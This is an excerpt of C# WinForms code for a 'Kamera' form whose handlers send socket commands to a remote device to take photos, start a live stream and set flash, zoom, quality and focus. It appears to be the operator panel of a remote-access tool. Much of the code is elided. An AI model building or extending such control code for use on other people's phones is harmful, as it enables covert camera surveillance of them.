    ...
    public partial class Kamera : Form
    {
        ...
        private void button1_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(comboBox6.SelectedItem.ToString()))
            {
                ...
                try
                {
                    ...
                    Form1.CommandSend("CAM", "[VERI]" + cam + "[VERI]" + flashmode + "[VERI]" + resolution + "[VERI][0x09]", soketimiz);
        ...
        private void button4_Click(object sender, EventArgs e)
        {
            ...
            if (enabled == false)
            {
                if (!string.IsNullOrEmpty(comboBox6.SelectedItem.ToString()))
                {
                    ...
                    Form1.CommandSend("LIVESTREAM", "[VERI]" + cam + "[VERI]" + flashmode + "[VERI]" + resolution + "[VERI]" + comboBox3.SelectedItem.ToString().Replace("%", "") +
        ...
        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (button4.Text == "Stop")
            {
                ...
                {
                    Form1.CommandSend("LIVEFLASH", "[VERI]1[VERI][0x09]", soketimiz);
                }
                else
                {
                    Form1.CommandSend("LIVEFLASH", "[VERI]0[VERI][0x09]", soketimiz);
                }
            }
        }
        ...
        private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (button4.Text == "Stop")
            {
                ...
                {
                    Form1.CommandSend("QUALITY", $"[VERI]{comboBox3.SelectedItem.ToString().Replace("%", "")}[VERI][0x09]", soketimiz);
                }
            }
        }
        ...
        private void button2_Click(object sender, EventArgs e)
        {
            ...
            {
                zoom += 1;
                Form1.CommandSend("ZOOM", $"[VERI]{zoom}[VERI][0x09]", soketimiz);
        ...
        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (button4.Text == "Stop")
            {
                ...
                {
                    Form1.CommandSend("FOCUSELIVE", "[VERI]1[VERI][0x09]", soketimiz);
                }
                else
                {
                    Form1.CommandSend("FOCUSELIVE", "[VERI]0[VERI][0x09]", soketimiz);
                }
            }
        }
    }
